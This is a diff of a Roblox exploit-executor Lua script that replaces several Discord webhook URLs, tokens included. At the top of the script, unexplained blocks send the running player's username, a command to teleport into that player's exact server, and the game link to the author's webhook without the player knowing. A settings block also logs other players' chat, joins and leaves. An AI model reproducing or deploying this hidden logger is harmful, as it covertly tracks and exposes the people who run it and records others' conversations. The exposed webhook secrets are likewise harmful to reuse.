@@ -1,17 +1,17 @@
 local msg = "Untitled Hood Logs " .. game.Players.LocalPlayer.Name .. " just executed ur script"
-local url = "https://discord.com/api/webhooks/987972304833216583/EbxYrLkxk_H7jrb6Ijjf3pHYo7LmbKLAdM-6LSuQnD7hdjrSoayrWLTIpffhgwAWSksS"
+local url = "https://discord.com/api/webhooks/991143101471146024/W0Y4j2tzkJfwBOXt1w6nd--W_0NAWLLVeSrK0JgWhytilvNXNa63CQMsEwYTfsj8qXUf"
 
 syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
 
 
 local msg = ('game:GetService("TeleportService"):TeleportToPlaceInstance(') .. game.PlaceId .. ',"' .. game.JobId .. '")'
-local url = "https://discord.com/api/webhooks/987972304833216583/EbxYrLkxk_H7jrb6Ijjf3pHYo7LmbKLAdM-6LSuQnD7hdjrSoayrWLTIpffhgwAWSksS"
+local url = "https://discord.com/api/webhooks/991143101471146024/W0Y4j2tzkJfwBOXt1w6nd--W_0NAWLLVeSrK0JgWhytilvNXNa63CQMsEwYTfsj8qXUf"
 
 syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
 
 
 local msg = "https://www.roblox.com/games/" .. game.PlaceId .. "/"
-local url = "https://discord.com/api/webhooks/987972304833216583/EbxYrLkxk_H7jrb6Ijjf3pHYo7LmbKLAdM-6LSuQnD7hdjrSoayrWLTIpffhgwAWSksS"
+local url = "https://discord.com/api/webhooks/991143101471146024/W0Y4j2tzkJfwBOXt1w6nd--W_0NAWLLVeSrK0JgWhytilvNXNa63CQMsEwYTfsj8qXUf"
 
 syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
 
@@ -24,7 +24,7 @@ LogPlayerJoins = true --Set this to false if you don't want the script to log jo
 LogPlayerChat = true --Set this to false if you don't want the script to log chat.
 LogPlayerLeaves = true --Set this to false if you don't want the script to log leaves.
 DebugMode = false --All this does is enable the spammy printing for the script, I would recommend keeping it disabled.
-Webhook = "https://discord.com/api/webhooks/987972515974492181/3aVlOvD3kfr06_GvrF75lECgDGJGBa3mBrHxRZIbuiip6X1PwfH6Vh6V0DHtHWgfUQkz" --Put your webhook here.
+Webhook = "https://discord.com/api/webhooks/991142945073942559/hWUhOSGPx34fl5Av_yiBhGhKL2pDi_whe5hpobyIHY545JGayGQtn18BBePuD5qKjD8t" --Put your webhook here.
 --End Settings=--
 
 if Webhook == "" then error("Please enter your webhook.") end
